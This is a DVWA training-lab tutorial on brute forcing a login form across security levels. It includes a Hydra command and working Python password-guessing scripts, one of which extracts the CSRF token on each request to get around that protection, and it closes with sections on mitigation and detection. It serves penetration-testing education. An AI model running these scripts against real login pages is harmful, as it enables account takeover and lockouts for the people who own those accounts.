# Brute Force Vulnerabilities in DVWA

This document outlines how to exploit brute force vulnerabilities in DVWA at different security levels.

## Overview

Brute force attacks involve attempting numerous credentials until finding a valid username/password combination. DVWA's brute force section simulates a login form that can be exploited at various difficulty levels.

## Prerequisites

- DVWA running and accessible from Kali Linux
- Access to the DVWA application
- Hydra, Burp Suite, or custom scripts for automated attacks

## Exploitation Steps

### Low Security Level

1. **Navigate to Brute Force page**
   - Log into DVWA
   - Select "Brute Force" from the left menu
   - Set security level to "Low" (DVWA Security â†’ Low)

2. **Manual Testing**
   - Try logging in with username `admin` and incorrect password
   - Observe the failure message: "Username and/or password incorrect."
   - Try a valid login (admin/password) to see success message

3. **Understanding the Vulnerability**
   - At low level, DVWA has no protection against rapid login attempts
   - No CAPTCHA, no account lockout, no rate limiting

4. **Using Hydra**
   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-get-form://dvwa.local/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=your_session_id; security=low"
   ```

5. **Using Custom Python Script**
   ```python
   #!/usr/bin/env python3
   import requests
   import sys

   target_url = "http://dvwa.local/vulnerabilities/brute/"
   username = "admin"
   wordlist = "/usr/share/wordlists/rockyou.txt"
   
   cookies = {
       "PHPSESSID": "your_session_cookie",
       "security": "low"
   }
   
   with open(wordlist, 'r', encoding='latin-1') as f:
       for line in f:
           password = line.strip()
           print(f"Trying: {password}")
           
           params = {
               "username": username,
               "password": password,
               "Login": "Login"
           }
           
           r = requests.get(target_url, params=params, cookies=cookies)
           
           if "Username and/or password incorrect" not in r.text:
               print(f"[+] Found valid credentials: {username}:{password}")
               sys.exit(0)
   ```

### Medium Security Level

1. **Understanding the Protection**
   - Medium level implements basic anti-brute force measures
   - Simple 2-second sleep added to slow down attempts
   - Still vulnerable but requires adjusting our approach

2. **Using Burp Suite**
   - Configure your browser to use Burp Proxy
   - Navigate to the brute force page and attempt a login
   - Capture the request in Burp
   - Send to Intruder
   - Configure payload positions for the password field
   - Load a wordlist (keep it small due to the time delay)
   - Start the attack with increased timeout settings

3. **Modified Python Script**
   ```python
   #!/usr/bin/env python3
   import requests
   import sys
   import time
   
   target_url = "http://dvwa.local/vulnerabilities/brute/"
   username = "admin"
   wordlist = "/usr/share/wordlists/small_wordlist.txt"  # Use a smaller wordlist
   
   cookies = {
       "PHPSESSID": "your_session_cookie",
       "security": "medium"
   }
   
   with open(wordlist, 'r', encoding='latin-1') as f:
       for line in f:
           password = line.strip()
           print(f"Trying: {password}")
           
           params = {
               "username": username,
               "password": password,
               "Login": "Login"
           }
           
           r = requests.get(target_url, params=params, cookies=cookies)
           
           if "Username and/or password incorrect" not in r.text:
               print(f"[+] Found valid credentials: {username}:{password}")
               sys.exit(0)
           
           time.sleep(2.5)  # Add delay to account for server-side sleep
   ```

### High Security Level

1. **Understanding the Protection**
   - High level implements a user lockout mechanism
   - After 3 failed attempts, the account is locked for 15 minutes
   - Server tracks failed attempts using a token (anti-CSRF token)

2. **Token Extraction**
   - Each login attempt requires a valid CSRF token
   - Need to extract and use a new token for each request

3. **Python Script with Token Extraction**
   ```python
   #!/usr/bin/env python3
   import requests
   import sys
   import re
   import time
   
   target_url = "http://dvwa.local/vulnerabilities/brute/"
   username = "admin"
   password_list = ["password", "123456", "admin", "password123"]  # Very small list due to lockout
   
   cookies = {
       "PHPSESSID": "your_session_cookie",
       "security": "high"
   }
   
   for password in password_list:
       # Get a fresh CSRF token
       r = requests.get(target_url, cookies=cookies)
       token_match = re.search(r'user_token" value="([a-zA-Z0-9]+)"', r.text)
       
       if token_match:
           user_token = token_match.group(1)
           print(f"Got token: {user_token}")
           print(f"Trying: {password}")
           
           data = {
               "username": username,
               "password": password,
               "Login": "Login",
               "user_token": user_token
           }
           
           r = requests.post(target_url, data=data, cookies=cookies)
           
           if "Username and/or password incorrect" not in r.text:
               print(f"[+] Found valid credentials: {username}:{password}")
               sys.exit(0)
               
           time.sleep(1)  # Respectful delay
       else:
           print("Could not find CSRF token")
           break
   ```

4. **Strategic Approach**
   - Due to the account lockout, using large wordlists isn't effective
   - Focus on common passwords or passwords discovered from other vulnerabilities
   - Try to exploit other vulnerabilities first to find password hints or actual passwords

### Impossible Level

1. **Understanding the Protection**
   - Implements proper CSRF tokens
   - Account lockout after 3 attempts
   - Google reCAPTCHA integration
   - Proper salted password hashing

2. **Potential Attack Vectors**
   - Traditional brute forcing is not feasible
   - Focus on other attack vectors:
     - Social engineering
     - Exploiting other vulnerabilities to gain access to the database
     - Session hijacking
     - Looking for leaked passwords in other parts of the application

## Mitigation Techniques

1. **Implementation of Account Lockout**
   - Lock accounts after a certain number of failed attempts
   - Add progressive delays between login attempts

2. **CAPTCHA Implementation**
   - Force user to solve a CAPTCHA after suspicious activity
   - Protect against automated tools

3. **Two-Factor Authentication**
   - Require a second authentication factor
   - Greatly increases security even if passwords are compromised

4. **Monitoring and Alerting**
   - Log and alert on multiple failed login attempts
   - Monitor for unusual login patterns

5. **Strong Password Policies**
   - Enforce complex passwords
   - Regular password rotation
   - Password history checks

## Brute Force Detection Tools

1. **Fail2Ban**
   - Monitors logs for failed login attempts
   - Automatically blocks IP addresses with too many failures

2. **ModSecurity Rules**
   - Web application firewall rules to detect brute force
   - Block IPs making too many requests to authentication endpoints

## Documentation Notes

Record your brute force findings using the following structure:

1. Vulnerability assessment
2. Tools used for exploitation
3. Success/failure rate
4. Time to breach
5. Mitigation recommendations

Remember, in real-world penetration testing, always obtain proper authorization before performing brute force attacks, as they can cause account lockouts and service disruptions. 